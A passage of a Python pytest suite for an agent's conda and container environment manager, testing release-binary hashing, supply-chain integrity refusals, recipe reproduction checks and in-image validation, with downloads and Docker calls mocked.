    assert "dead.pid" in result["removed"], "dead PID file must be reaped"
    assert "garbage.pid" in result["removed"], "unparseable PID file must be reaped"
    assert (fake_pid_dir / "alive.pid").exists(), "live PID file must be preserved"


# ---------------------------------------------------------------------------
# Re-spine Phase 0: evidence-strategy registry + universal apply() primitive
# ---------------------------------------------------------------------------

def test_evidence_registry_exposes_named_strategies():
    """The evidence registry is the single source of truth for presence proofs;
    every composing install tier looks anchors up by name here. A dropped or
    renamed strategy must fail loudly rather than silently weaken a tier."""
    from agent.skills import evidence
    expected = {
        "cli_which", "conda_registry", "pip_show", "r_namespace",
        "perl_module_load", "file_present",
        "registry_anchor", "presence_anchor",
    }
    assert expected <= set(evidence.STRATEGIES), \
        f"missing strategies: {expected - set(evidence.STRATEGIES)}"
    assert all(callable(fn) for fn in evidence.STRATEGIES.values())


def test_evidence_strategy_returns_uniform_shape():
    """Every strategy returns the {strategy, anchored, detail} Evidence shape.
    Drive cli_which against a fake EnvManager whose run_in_env reports a miss —
    no conda needed, so this runs everywhere."""
    from agent.skills import evidence

    class _FakeEM:
        def run_in_env(self, env, cmd, timeout=0):
            return {"returncode": 1, "stdout": "", "stderr": ""}

    ev = evidence.cli_which(_FakeEM(), "anyenv", "nope")
    assert set(ev) == {"strategy", "anchored", "detail"}
    assert ev["strategy"] == "cli_which"
    assert ev["anchored"] is False
    assert ev["detail"] is None

    # presence_anchor falls through which → registry; with everything missing it
    # must report not-anchored (the gate that blocks the echo cheat).
    ev2 = evidence.presence_anchor(_FakeEM(), "anyenv", "nope")
    assert ev2["anchored"] is False


def test_apply_raw_command_captures_mutation():
    """apply(in_env=False) is the universal mutation primitive for base-context
    commands; it must return a well-formed Mutation. Uses /bin/echo so it needs
    no conda env to RUN — only an EnvManager to construct (guarded on conda)."""
    import shutil, pytest as _pytest, yaml as _yaml
    from pathlib import Path as _Path
    from agent.skills.env_manager import EnvManager
    cfg_path = _Path(__file__).parent.parent / "config" / "agent_config.yaml"
    if not cfg_path.exists() or not shutil.which("conda"):
        _pytest.skip("conda or agent_config.yaml not available")
    em = EnvManager(_yaml.safe_load(cfg_path.read_text()))

    m = em.apply("anyenv", ["echo", "phase0"], in_env=False, timeout=30)
    assert m["success"] is True
    assert m["returncode"] == 0
    assert "phase0" in m["stdout"]
    assert m["command"] == ["echo", "phase0"]


def test_apply_rejects_mismatched_command_type():
    """The in_env flag and the command type must agree — a string for a raw
    base command (or a list for an in-env shell command) is a programming
    error, caught early rather than mis-executed."""
    import shutil, pytest as _pytest, yaml as _yaml
    from pathlib import Path as _Path
    from agent.skills.env_manager import EnvManager
    cfg_path = _Path(__file__).parent.parent / "config" / "agent_config.yaml"
    if not cfg_path.exists() or not shutil.which("conda"):
        _pytest.skip("conda or agent_config.yaml not available")
    em = EnvManager(_yaml.safe_load(cfg_path.read_text()))

    with _pytest.raises(TypeError):
        em.apply("anyenv", "echo hi", in_env=False)      # raw mode wants a list
    with _pytest.raises(TypeError):
        em.apply("anyenv", ["echo", "hi"], in_env=True)   # in-env mode wants a string


# ---------------------------------------------------------------------------
# Re-spine Slice 1: release-binary tier (I14) + file_present evidence + staging
# ---------------------------------------------------------------------------

def test_file_present_evidence_hash_gate(tmp_path):
    """file_present anchors only when the file exists AND (if given) its sha256
    matches — the on-disk proof behind the release-binary tier."""
    import hashlib
    from agent.skills import evidence
    f = tmp_path / "bin"
    f.write_bytes(b"abc123")
    sha = hashlib.sha256(f.read_bytes()).hexdigest()

    ok = evidence.file_present(None, "anyenv", str(f), sha256=sha)
    assert ok["anchored"] is True and ok["strategy"] == "file_present"
    bad = evidence.file_present(None, "anyenv", str(f), sha256="00" * 32)
    assert bad["anchored"] is False
    missing = evidence.file_present(None, "anyenv", str(tmp_path / "nope"))
    assert missing["anchored"] is False
    # present, no hash given → anchored on existence alone
    assert evidence.file_present(None, "anyenv", str(f))["anchored"] is True


def test_stage_release_binary_extracts_locates_and_wraps(tmp_path):
    """The post-download staging (extract archive → locate executable → write
    PATH launcher) works without a network download. Builds a real .tar.gz with
    the binary under a bin/ subdir, the common release layout."""
    import tarfile, shutil, pytest as _pytest, yaml as _yaml
    from pathlib import Path as _Path
    from agent.skills.env_manager import EnvManager
    cfg_path = _Path(__file__).parent.parent / "config" / "agent_config.yaml"
    if not cfg_path.exists() or not shutil.which("conda"):
        _pytest.skip("conda or agent_config.yaml not available")
    em = EnvManager(_yaml.safe_load(cfg_path.read_text()))

    # Build sometool-1.0/bin/sometool inside a tarball.
    pkgroot = tmp_path / "pkg"
    (pkgroot / "sometool-1.0" / "bin").mkdir(parents=True)
    exe = pkgroot / "sometool-1.0" / "bin" / "sometool"
    exe.write_text("#!/bin/sh\necho hi\n")
    archive = tmp_path / "sometool-1.0-linux.tar.gz"
    with tarfile.open(archive, "w:gz") as tf:
        tf.add(pkgroot / "sometool-1.0", arcname="sometool-1.0")

    share_dir = tmp_path / "share" / "sometool"
    bin_dir   = tmp_path / "bin"
    share_dir.mkdir(parents=True)
    log: list = []
    res = em._stage_release_binary(
        share_dir, bin_dir, archive, "sometool",
        binary_in_archive="", wrapper_name="", log=log,
    )
    assert res["success"], f"staging should succeed: {res}"
    assert _Path(res["binary_path"]).name == "sometool"
    launcher = _Path(res["wrapper_path"])
    assert launcher.exists() and launcher.name == "sometool"
    assert res["binary_path"] in launcher.read_text()


def test_install_release_binary_archive_anchors_extracted_binary(tmp_path, monkeypatch):
    """REGRESSION (archive I14 mismatch): for a .tar.gz/.zip asset, the recorded
    install_method.sha256 must be the hash of the EXTRACTED binary — the artifact
    I14 re-hashes on disk — NOT the tarball. The archive's hash is kept separately
    as asset_sha256 (provenance). Before the fix, sha256 carried the tarball hash
    while local_path pointed at the inner binary, so I14 always mismatched for any
    real release binary (they all ship as archives).

    Offline: the curl-in-env download is monkeypatched to a local copy, so no
    conda env / network is needed — this exercises the real hash-recording logic."""
    import tarfile, hashlib, shlex, shutil as _sh, yaml as _yaml
    from pathlib import Path as _Path
    from agent.skills.env_manager import EnvManager
    cfg_path = _Path(__file__).parent.parent / "config" / "agent_config.yaml"
    em = EnvManager(_yaml.safe_load(cfg_path.read_text()))

    env_name = "bioinf_unit_relbin"
    env_path = em.envs_dir / env_name
    (env_path / "bin").mkdir(parents=True, exist_ok=True)
    try:
        # sometool/sometool inside a tarball — inner binary bytes ≠ tarball bytes.
        pkgroot = tmp_path / "pkg"
        (pkgroot / "sometool").mkdir(parents=True)
        exe = pkgroot / "sometool" / "sometool"
        exe.write_bytes(b"#!/bin/sh\necho hi\n")
        archive = tmp_path / "sometool-2.13.0-darwin-arm64.tar.gz"
        with tarfile.open(archive, "w:gz") as tf:
            tf.add(exe, arcname="sometool")
        tarball_sha = hashlib.sha256(archive.read_bytes()).hexdigest()
        binary_sha  = hashlib.sha256(exe.read_bytes()).hexdigest()
        assert tarball_sha != binary_sha, "fixture must be a genuine archive case"

        def fake_curl(en, command, timeout=None):
            toks = shlex.split(command)
            _sh.copy(archive, toks[toks.index("-o") + 1])  # simulate the download
            return {"returncode": 0, "stdout": "", "stderr": ""}
        monkeypatch.setattr(em, "run_in_env", fake_curl)

        res = em.install_release_binary(
            env_name=env_name, tool_name="sometool",
            url=f"https://example.invalid/{archive.name}", binary_in_archive="sometool",
        )
        assert res["success"], res
        im = res["install_method"]
        assert im["sha256"]       == binary_sha,  "sha256 must anchor the extracted binary (I14 target)"
        assert im["asset_sha256"] == tarball_sha, "asset_sha256 must keep the archive hash (provenance)"
        assert im["sha256"] != im["asset_sha256"]
        # The recorded local_path must actually hash to the recorded sha256 — this is
        # the bytes env_freeze re-fetches and the container build re-validates inside
        # the ship image (install==ship replaces the old host-side I14 re-hash).
        assert hashlib.sha256(_Path(im["local_path"]).read_bytes()).hexdigest() == im["sha256"]
    finally:
        _sh.rmtree(env_path, ignore_errors=True)


def test_install_release_binary_sha256_mismatch_is_refused_firewall(tmp_path, monkeypatch):
    """ADVERSARIAL (supply-chain firewall / full-auto safety). An autonomous
    agent TRUSTS a green artifact — so a downloaded asset whose sha256 does NOT
    match the published checksum MUST be rejected BEFORE anything is staged, and
    the rejection must be LEGIBLE (outcome=refused, code=binary_sha256_mismatch,
    both hashes surfaced) — never a silent install of a wrong/tampered binary and
    never an uncaught crash. Attacks the previously-dark
    env_manager.binary_sha256_mismatch branch. Offline: curl is monkeypatched."""
    import hashlib, shlex, shutil as _sh, yaml as _yaml
    from pathlib import Path as _Path
    from agent.skills.env_manager import EnvManager
    cfg_path = _Path(__file__).parent.parent / "config" / "agent_config.yaml"
    em = EnvManager(_yaml.safe_load(cfg_path.read_text()))

    env_name = "bioinf_unit_relbin_mismatch"
    env_path = em.envs_dir / env_name
    (env_path / "bin").mkdir(parents=True, exist_ok=True)
    try:
        asset = tmp_path / "tool-1.0-linux.bin"
        asset.write_bytes(b"the REAL downloaded bytes (a wrong/tampered asset)")
        real_sha = hashlib.sha256(asset.read_bytes()).hexdigest()
        published_sha = "0" * 64          # what the caller EXPECTS; asset won't match
        assert published_sha != real_sha

        def fake_curl(en, command, timeout=None):
            toks = shlex.split(command)
            _sh.copy(asset, toks[toks.index("-o") + 1])     # simulate the download
            return {"returncode": 0, "stdout": "", "stderr": ""}
        monkeypatch.setattr(em, "run_in_env", fake_curl)

        res = em.install_release_binary(
            env_name=env_name, tool_name="tool",
            url=f"https://example.invalid/{asset.name}", sha256=published_sha,
        )
        # 1) firewall FIRED as a clean, legible refusal — not a crash, not a green.
        assert res.get("success") is False, res
        assert res.get("outcome") == "refused", res
        assert res.get("code") == "env_manager.binary_sha256_mismatch", res
        # 2) both hashes surfaced so an autonomous caller can diagnose.
        assert res.get("expected_sha256") == published_sha
        assert res.get("actual_sha256") == real_sha
        # 3) THE load-bearing safety property: nothing was staged — the wrong
        #    binary never became runnable (no PATH wrapper in bin/).
        assert not (env_path / "bin" / "tool").exists(), \
            "firewall must refuse BEFORE staging — no wrapper may exist"
    finally:
        _sh.rmtree(env_path, ignore_errors=True)


# ---------------------------------------------------------------------------
# F2 — the install→ship INTEGRITY CHAIN for the binary tier.
#
# The hole: `freeze` re-fetches a release asset and anchors the ship image to
# WHATEVER the URL serves at freeze time, never comparing against the install-
# time hash. A binary mutated between install and freeze (swapped upload /
# compromised mirror) ships as `proven`/`frozen` — VALIDATED_IN_IMAGE only
# proves it RUNS, not that it's untampered. These tests certify the fix:
#   1. same asset, hash changed install→ship        → REFUSE (the firewall)
#   2. same asset, publisher-checksum verified       → verified=True
#   3. same asset, no publisher checksum (TOFU)      → ships, verified=False
#   4. cross-platform ship asset (never installed)   → ships, verified=False
#   5. install records whether it authenticated the asset (the honest anchor)
#   6. the firewall's SPECIFIC code survives the build_env_image call site
# ---------------------------------------------------------------------------

def _binary_record(binary_url, asset_sha256, *, authenticated=False):
    """An install_method record as install_release_binary would leave it."""
    return {"name": "tool", "type": "binary", "install_method": {
        "type": "binary", "binary_url": binary_url, "sha256": "deadbeef",
        "asset_sha256": asset_sha256, "asset_authenticated": authenticated,
        "local_path": "/e/share/tool/tool"}}


def test_map_install_binary_integrity_mismatch_is_refused_firewall():
    """ADVERSARIAL (F2 supply-chain firewall / full-auto safety). Attack: the
    SAME release asset the install anchored is mutated before freeze re-fetches
    it. Freeze MUST compare the re-fetch hash against the recorded install-time
    asset_sha256 and REFUSE on mismatch — never silently ship the swapped bytes.
    The refusal must be legible (outcome=refused, code=binary_integrity_mismatch,
    both hashes surfaced). Injected resolvers → offline, deterministic."""
    from agent.skills.env_freeze import _map_install
    url = "https://github.com/x/tool/releases/download/v1/tool_linux_amd64.tar.gz"
    rec = _binary_record(url, asset_sha256="a" * 64, authenticated=True)
    out = _map_install(
        rec,
        resolve_linux_asset=lambda u, **k: {"found": True, "url": url},   # SAME asset
        sha256_of_url=lambda u, **k: {"ok": True, "sha256": "b" * 64},     # bytes CHANGED
    )
    assert out.get("outcome") == "refused", out
    assert out.get("code") == "build.binary_integrity_mismatch", out
    assert out.get("install_asset_sha256") == "a" * 64
    assert out.get("freeze_asset_sha256") == "b" * 64
    assert "spec" not in out, "a mutated asset must NOT produce a shippable spec"


def test_map_install_binary_authenticated_chain_is_verified():
    """Same asset, publisher checksum matched at install (asset_authenticated),
    freeze re-fetch hash EQUALS the install hash → the chain is intact AND
    authenticated → the shipped binary is disclosed verified=True."""
    from agent.skills.env_freeze import _map_install
    url = "https://github.com/x/tool/releases/download/v1/tool_linux_amd64.tar.gz"
    rec = _binary_record(url, asset_sha256="c" * 64, authenticated=True)
    out = _map_install(
        rec,
        resolve_linux_asset=lambda u, **k: {"found": True, "url": url},
        sha256_of_url=lambda u, **k: {"ok": True, "sha256": "c" * 64},   # unchanged
    )
    assert "spec" in out, out
    prov = out["spec"]["provenance"]
    assert prov["verified"] is True and prov["assurance"] == "authenticated", prov


def test_map_install_binary_tofu_ships_unverified():
    """Same asset, unchanged install→ship, but NO publisher checksum was matched
    at install (trust-on-first-use). It ships (valid) but must be disclosed as
    unverified — C5 legibility: a green must not conflate authenticated with TOFU."""
    from agent.skills.env_freeze import _map_install
    url = "https://github.com/x/tool/releases/download/v1/tool_linux_amd64.tar.gz"
    rec = _binary_record(url, asset_sha256="d" * 64, authenticated=False)
    out = _map_install(
        rec,
        resolve_linux_asset=lambda u, **k: {"found": True, "url": url},
        sha256_of_url=lambda u, **k: {"ok": True, "sha256": "d" * 64},
    )
    assert "spec" in out, out
    prov = out["spec"]["provenance"]
    assert prov["verified"] is False and prov["assurance"] == "pinned_tofu", prov


def test_map_install_binary_cross_platform_ships_unverified_not_refused():
    """The COMMON case: install on darwin, ship linux. resolve_linux_asset returns
    a DIFFERENT asset than the install anchored — there is no install-time hash for
    it, so the integrity firewall must NOT fire (no false refuse), but the shipped
    binary must be disclosed unverified (unanchored_cross_platform). This proves
    freeze ACCEPTS an unverified-but-valid binary (degraded-style), just flagged."""
    from agent.skills.env_freeze import _map_install
    darwin = "https://github.com/x/tool/releases/download/v1/tool_darwin_arm64.tar.gz"
    linux  = "https://github.com/x/tool/releases/download/v1/tool_linux_amd64.tar.gz"
    rec = _binary_record(darwin, asset_sha256="e" * 64, authenticated=True)
    out = _map_install(
        rec,
        resolve_linux_asset=lambda u, **k: {"found": True, "url": linux},   # DIFFERENT
        sha256_of_url=lambda u, **k: {"ok": True, "sha256": "f" * 64},
    )
    assert "spec" in out, f"cross-platform ship must not be refused: {out}"
    prov = out["spec"]["provenance"]
    assert prov["verified"] is False, prov
    assert prov["assurance"] == "unanchored_cross_platform", prov


def test_install_release_binary_records_asset_authenticated(tmp_path, monkeypatch):
    """Part-2 source of truth: install_release_binary must record WHETHER it
    authenticated the asset against a caller-supplied publisher checksum. With a
    (correct) sha256 → asset_authenticated=True; without → False. Freeze reads
    this to decide authenticated vs pinned-TOFU assurance. Offline (curl mocked)."""
    import hashlib, shlex, shutil as _sh, yaml as _yaml
    from pathlib import Path as _Path
    from agent.skills.env_manager import EnvManager
    cfg_path = _Path(__file__).parent.parent / "config" / "agent_config.yaml"
    em = EnvManager(_yaml.safe_load(cfg_path.read_text()))
    env_name = "bioinf_unit_relbin_auth"
    env_path = em.envs_dir / env_name
    (env_path / "bin").mkdir(parents=True, exist_ok=True)
    try:
        asset = tmp_path / "tool-1.0-linux.bin"
        asset.write_bytes(b"single-binary payload")
        real_sha = hashlib.sha256(asset.read_bytes()).hexdigest()

        def fake_curl(en, command, timeout=None):
            toks = shlex.split(command)
            _sh.copy(asset, toks[toks.index("-o") + 1])
            return {"returncode": 0, "stdout": "", "stderr": ""}
        monkeypatch.setattr(em, "run_in_env", fake_curl)

        # WITH the publisher checksum → authenticated.
        res = em.install_release_binary(env_name=env_name, tool_name="tool",
                                        url=f"https://example.invalid/{asset.name}", sha256=real_sha)
        assert res["success"] and res["asset_authenticated"] is True, res
        assert res["install_method"]["asset_authenticated"] is True

        # WITHOUT → pinned TOFU, honestly marked not-authenticated.
        _sh.rmtree(env_path / "share", ignore_errors=True)
        res2 = em.install_release_binary(env_name=env_name, tool_name="tool2",
                                         url=f"https://example.invalid/{asset.name}")
        assert res2["success"] and res2["asset_authenticated"] is False, res2
        assert res2["install_method"]["asset_authenticated"] is False
    finally:
        _sh.rmtree(env_path, ignore_errors=True)


def test_build_env_image_propagates_binary_integrity_firewall_code(monkeypatch):
    """The firewall's SPECIFIC code must survive the build_env_image call site as
    `inner_code` — previously EVERY mapper failure was flattened to a single
    generic code (and wrongly forced `refused`), hiding the integrity firewall
    from a caller. The boundary keeps its own literal code (model-legible) while
    preserving WHY it refused, and preserves the outcome CLASS (refused→refused)."""
    from agent.skills import env_freeze
    from agent.skills.outcomes import refused
    monkeypatch.setattr(env_freeze._freeze, "non_conda_installs",
                        lambda spec: [{"name": "tool", "type": "binary",
                                       "install_method": {"type": "binary"}}])
    monkeypatch.setattr(env_freeze, "_map_install",
                        lambda x, platform="linux/amd64", **k: refused(
                            "build.binary_integrity_mismatch", error="mutated"))
    out = env_freeze.build_env_image({}, name="tool")
    assert out.get("outcome") == "refused", out            # class preserved
    assert out.get("code") == "build.map_install_refused", out   # boundary's own code
    assert out.get("inner_code") == "build.binary_integrity_mismatch", out  # WHY, preserved
    assert out.get("stage") == "map_install" and out.get("success") is False, out


# ---------------------------------------------------------------------------
# C2 firewall certification — the honesty gates that catch a false-green must
# each have an ADVERSARIAL test that triggers their REJECT branch. A firewall
# that never fires under test is an unproven claim under full-auto. These attack
# the previously-dark reject terminals.
# ---------------------------------------------------------------------------

def test_verify_env_recipe_load_failed_is_refused_firewall():
    """ADVERSARIAL (recipe reproduction gate). A recipe path that cannot be read
    must REFUSE legibly (outcome=refused, code=recipe_load_failed) — never crash,
    never silently 'reproduce nothing and pass'. Attacks freeze.recipe_load_failed."""
    from agent.mcp_tools.freeze_tools import verify_env_recipe
    out = verify_env_recipe("/nonexistent/does/not/exist.recipe.yaml")
    assert out.get("outcome") == "refused", out
    assert out.get("code") == "freeze.recipe_load_failed", out
    assert out.get("success") is False


def test_verify_env_recipe_invalid_is_refused_firewall(tmp_path):
    """ADVERSARIAL (recipe reproduction gate). A file that loads as YAML but is
    NOT a valid env recipe (no `name`) must refuse (recipe_invalid) BEFORE any
    rebuild — a malformed recipe can't be allowed to reach the build."""
    from agent.mcp_tools.freeze_tools import verify_env_recipe
    bad = tmp_path / "bad.recipe.yaml"
    bad.write_text("just_a_list:\n  - 1\n  - 2\n")   # a dict, but no `name`
    out = verify_env_recipe(str(bad))
    assert out.get("outcome") == "refused", out
    assert out.get("code") == "freeze.recipe_invalid", out


def test_verify_env_recipe_verified_is_proven_on_reproduction(tmp_path, monkeypatch):
    """freeze.recipe_verified: when the recipe rebuild SUCCEEDS and converges to the
    recorded content_digest, verify_env_recipe returns the honest reproducibility
    green (completes the pair with recipe_not_reproduced). Rebuild mocked."""
    from agent.mcp_tools import freeze_tools
    from agent import mcp_server as _ms
    recipe = tmp_path / "ok.recipe.yaml"
    recipe.write_text("name: bioinf_x\nversion: '1.0'\n")
    monkeypatch.setattr(_ms._env_recipe, "rebuild_from_recipe",
                        lambda rec, **k: {
                            "success": True, "content_digest_match": True,   # REPRODUCED
                            "rebuilt_content_digest": "sha256:" + "a" * 64,
                            "expected_content_digest": "sha256:" + "a" * 64,
                            "proves": ["COMPLETENESS", "LOCAL DETERMINISM"],
                            "build": {"stage": "done", "honesty_violations": []}})
    out = freeze_tools.verify_env_recipe(str(recipe))
    assert out.get("outcome") == "proven", out
    assert out.get("code") == "freeze.recipe_verified", out
    assert out.get("content_digest_match") is True


@pytest.mark.parametrize("store,config_blob_id", [
    # containerd snapshotter: .Id COINCIDES with the manifest digest. This is what the
    # project's dev Mac runs, which is the only reason the .Id bug ever passed here.
    ("containerd", None),
    # classic overlay2 (most Linux, most CI, most users): .Id is the CONFIG BLOB digest,
    # a different value entirely. Reading .Id here reports "not reproduced" for every
    # adopt recipe ever written.
    ("overlay2", "sha256:" + "9f" * 32),
])
def test_verify_env_recipe_adopt_reads_the_pullable_manifest_digest_not_local_id(
        tmp_path, monkeypatch, store, config_blob_id):
    """An adopt recipe verifies against the REGISTRY MANIFEST digest, on ANY docker store.

    An adopt env's `content_digest` IS the biocontainer's published manifest digest — it
    is literally visible in `adopt_image: repo@sha256:…`. The branch used to compare it to
    `docker inspect {{index .Id}}`, the daemon's LOCAL content id. Those two coincide ONLY
    under the containerd snapshotter; under overlay2 `.Id` is the config blob digest.

    So `verify_env_recipe` — a tool whose entire job is telling a user whether their env
    reproduces — passed by accident of one developer's docker config and lied to everyone
    else (audit 2026-07-16 Tier 6). Parametrized over both stores because the bug is
    invisible on exactly one of them, and that one is ours.

    Stubs the DOCKER BOUNDARY (subprocess), not our logic, so the real digest-selection
    code runs. Reverting to `.Id` fails the overlay2 case."""
    from agent.mcp_tools import freeze_tools
    from agent.skills import container_build
    MANIFEST = "sha256:" + "d1" * 32
    IMG = f"quay.io/biocontainers/samtools@{MANIFEST}"
    recipe = tmp_path / "adopt.recipe.yaml"
    recipe.write_text(
        "name: samtools_env\nbuild_method: adopt\n"
        f"adopt_image: {IMG}\ncontent_digest: {MANIFEST}\n")

    def fake_run(argv, *a, **kw):
        joined = " ".join(argv) if isinstance(argv, (list, tuple)) else str(argv)
        r = type("R", (), {"returncode": 0, "stdout": "", "stderr": ""})()
        if "{{index .Id}}" in joined or "{{.Id}}" in joined:
            # the local content id — equals the manifest only on containerd
            r.stdout = (config_blob_id or MANIFEST) + "\n"
        elif "RepoDigests" in joined:
            # the pullable reference — identical on both stores, which is the point
            r.stdout = f"{IMG}\n"
        return r
    monkeypatch.setattr(freeze_tools.subprocess, "run", fake_run)
    monkeypatch.setattr(container_build.subprocess, "run", fake_run)

    out = freeze_tools.verify_env_recipe(str(recipe))
    assert out.get("code") == "freeze.recipe_verified", (store, out)
    assert out.get("content_digest_match") is True, (store, out)
    assert out.get("rebuilt_content_digest") == MANIFEST, (store, out)


def test_verify_env_recipe_adopt_refuses_a_genuinely_different_image(tmp_path, monkeypatch):
    """The pair to the above: a REAL mismatch must still be caught.

    Reading the manifest digest must not become a rubber stamp — if the registry now
    serves different bytes under the recorded reference, that is exactly the drift
    verify_env_recipe exists to surface."""
    from agent.mcp_tools import freeze_tools
    from agent.skills import container_build
    EXPECTED = "sha256:" + "d1" * 32
    ACTUAL   = "sha256:" + "ee" * 32          # the registry served something else
    recipe = tmp_path / "adopt.recipe.yaml"
    recipe.write_text(
        "name: samtools_env\nbuild_method: adopt\n"
        f"adopt_image: quay.io/biocontainers/samtools@{EXPECTED}\n"
        f"content_digest: {EXPECTED}\n")

    def fake_run(argv, *a, **kw):
        joined = " ".join(argv) if isinstance(argv, (list, tuple)) else str(argv)
        r = type("R", (), {"returncode": 0, "stdout": "", "stderr": ""})()
        if "RepoDigests" in joined:
            r.stdout = f"quay.io/biocontainers/samtools@{ACTUAL}\n"
        return r
    monkeypatch.setattr(freeze_tools.subprocess, "run", fake_run)
    monkeypatch.setattr(container_build.subprocess, "run", fake_run)

    out = freeze_tools.verify_env_recipe(str(recipe))
    assert out.get("code") == "freeze.recipe_not_reproduced", out
    assert out.get("content_digest_match") is False, out


def test_verify_env_recipe_not_reproduced_is_broke_firewall(tmp_path, monkeypatch):
    """ADVERSARIAL (reproducibility firewall / full-auto trust). When the recipe
    rebuild SUCCEEDS but converges to a DIFFERENT content_digest than recorded
    (local drift — the recipe didn't reproduce), it must be `broke`, NOT a green
    `recipe_verified`. A false 'reproduced' would let an unreproducible artifact
    claim reproducibility. Attacks freeze.recipe_not_reproduced (rebuild mocked)."""
    from agent.mcp_tools import freeze_tools
    from agent import mcp_server as _ms
    recipe = tmp_path / "ok.recipe.yaml"
    recipe.write_text("name: bioinf_x\nversion: '1.0'\n")
    monkeypatch.setattr(_ms._env_recipe, "rebuild_from_recipe",
                        lambda rec, **k: {
                            "success": True, "content_digest_match": False,   # DRIFTED
                            "rebuilt_content_digest": "sha256:" + "a" * 64,
                            "expected_content_digest": "sha256:" + "b" * 64,
                            "proves": [],
                            "build": {"stage": "done", "honesty_violations": []}})
    out = freeze_tools.verify_env_recipe(str(recipe))
    assert out.get("outcome") == "broke", out
    assert out.get("code") == "freeze.recipe_not_reproduced", out
    assert out.get("content_digest_match") is False


def test_container_build_validation_in_image_failure_is_broke_firewall(monkeypatch):
    """ADVERSARIAL (validated==shipped firewall). When a tool's evidence does NOT
    pass INSIDE the shipped image, validate_in_image must return `broke`
    (validation_in_image_failed) — never a green. This is the gate that makes
    'the bytes we validated ARE the bytes that ship' true; if it failed to fire, a
    tool absent/broken in the ship image would ship as proven. Docker is mocked so
    every in-image check returns rc=1."""
    from agent.skills.container_build import ContainerBuild
    cb = ContainerBuild()
    monkeypatch.setattr(cb, "_sh",
                        lambda args, timeout=1800: {"returncode": 1, "stdout": "", "stderr": "not found"})
    out = cb.validate_in_image("img@sha256:deadbeef", ["samtools --version"], probe_tools=[])
    assert out.get("outcome") == "broke", out
    assert out.get("code") == "container_build.validation_in_image_failed", out
    assert out.get("success") is False


def test_env_build_verification_in_image_failure_is_broke_firewall(monkeypatch):
    """ADVERSARIAL (validated==shipped firewall, EnvBuild level). verify_in_image
    re-runs every declared tool's evidence in the shipped image; when the in-image
    run fails it must return `broke` (verification_in_image_failed), never proven.
    The underlying container validate_in_image is mocked to report failure."""
    from agent.skills.env_build import EnvBuild
    eb = EnvBuild(name="bioinf_x")
    eb.verifications = [{"label": "samtools", "tool": "samtools",
                         "check": "samtools --version", "engine_coupled": True}]
    monkeypatch.setattr(eb.cb, "validate_in_image",
                        lambda image, checks, probe_tools=None: {
                            "success": False,
                            "checks": {c: {"rc": 1, "out": "not found"} for c in checks},
                            "banners": {}})
    out = eb.verify_in_image("img@sha256:deadbeef")
    assert out.get("outcome") == "broke", out
    assert out.get("code") == "env_build.verification_in_image_failed", out
    assert out.get("success") is False
    # the per-tool record must honestly show the failed evidence (not swallowed).
    assert out["verifications"][0]["passed"] is False


# The SUCCESS direction of the validated==shipped gates — completes the honesty
# pair: `proven` must fire ONLY when the in-image evidence genuinely passes. The
# failure-direction firewalls above prove it refuses a bad image; these prove a
# clean pass is a real green (executed + named), not a rubber stamp.

def test_container_build_sh_survives_non_utf8_output():
    """REGRESSION (found by the L15 real build): a tool's --version / banner probe
    can emit non-UTF-8 bytes (pigz writes gzip magic 0x1f 0x8b to stdout under a
    compress flag). ContainerBuild._sh must decode-tolerantly (errors='replace'),
    not raise UnicodeDecodeError and crash the whole build/validation. The
    returncode is preserved (it's the verdict the honesty check reads)."""
    from agent.skills.container_build import ContainerBuild
    # printf the gzip magic bytes to stdout — invalid UTF-8.
    out = ContainerBuild._sh(["bash", "-c", r"printf '\x1f\x8b\x08\x00'; exit 0"])
    assert out["returncode"] == 0, out          # did not crash; verdict preserved
    assert isinstance(out["stdout"], str)       # decoded (with replacement chars)


def test_output_validator_run_tool_survives_non_utf8(tmp_path):
    """REGRESSION (same class, validator path): _run_tool must not crash on a tool
    that emits non-UTF-8 bytes — a validator raising UnicodeDecodeError on tool
    output would be an uncaught crash on an honesty-critical check."""
    import yaml as _yaml
    from pathlib import Path as _P
    from agent.validators.output_validator import OutputValidator
    cfg = _yaml.safe_load((_P(__file__).parent.parent / "config" / "agent_config.yaml").read_text())
    ov = OutputValidator(cfg)
    cp = ov._run_tool(["bash", "-c", r"printf '\x1f\x8b\xff'; exit 0"])
    assert cp.returncode == 0                    # decoded tolerantly, no crash
    assert isinstance(cp.stdout, str)


def test_container_build_validated_in_image_success_is_proven(monkeypatch):
    """When every tool's evidence returns rc=0 INSIDE the image, validate_in_image
    must return proven(container_build.validated_in_image) — the honest green the
    whole validated==shipped contract rests on."""
    from agent.skills.container_build import ContainerBuild
    cb = ContainerBuild()
    monkeypatch.setattr(cb, "_sh",
                        lambda args, timeout=1800: {"returncode": 0, "stdout": "samtools 1.21", "stderr": ""})
    out = cb.validate_in_image("img@sha256:cafe", ["samtools --version"], probe_tools=[])
    assert out.get("outcome") == "proven", out
    assert out.get("code") == "container_build.validated_in_image", out
    assert out.get("success") is True


def test_env_build_verified_in_image_success_is_proven(monkeypatch):
    """EnvBuild.verify_in_image returns proven(env_build.verified_in_image) when
    the in-image run of every declared tool's evidence passes — the digest-matched
    green seal_workflow reads to assert validated_in_shipped_image."""
    from agent.skills.env_build import EnvBuild
    eb = EnvBuild(name="bioinf_x")
    eb.verifications = [{"label": "samtools", "tool": "samtools",
                         "check": "samtools --version", "engine_coupled": True}]
    monkeypatch.setattr(eb.cb, "validate_in_image",
                        lambda image, checks, probe_tools=None: {
                            "success": True,
                            "checks": {c: {"rc": 0, "out": "samtools 1.21"} for c in checks},
                            "banners": {"samtools": "samtools 1.21"}})
    out = eb.verify_in_image("img@sha256:cafe")
    assert out.get("outcome") == "proven", out
    assert out.get("code") == "env_build.verified_in_image", out
    assert out.get("success") is True
    assert out["verifications"][0]["passed"] is True


def test_env_build_built_is_proven_when_every_tool_installs(monkeypatch):
    """env_build.built: the container build completes only when EVERY long-tail
    tool's install returns success in-container. Mock cb.start + cb.install to
    succeed (no conda/pip layer) so the install-loop success path reaches proven."""
    from agent.skills.env_build import EnvBuild
    from agent.skills.outcomes import proven as _p
    eb = EnvBuild(name="bioinf_x")
    eb.tools = [{"command": "curl ... tool", "evidence": "tool --version",
                 "purpose": "tool (binary)", "tool": "tool"}]
    monkeypatch.setattr(eb.cb, "start", lambda: {"success": True})
    monkeypatch.setattr(eb.cb, "install", lambda spec, **k: _p("container_build.run_ok", success=True))
    out = eb.build()
    assert out.get("outcome") == "proven", out
    assert out.get("code") == "env_build.built", out
    # and a FAILED tool install must NOT be proven (the honest negative).
    monkeypatch.setattr(eb.cb, "install",
                        lambda spec, **k: {"success": False, "stderr": "boom"})
    bad = eb.build()
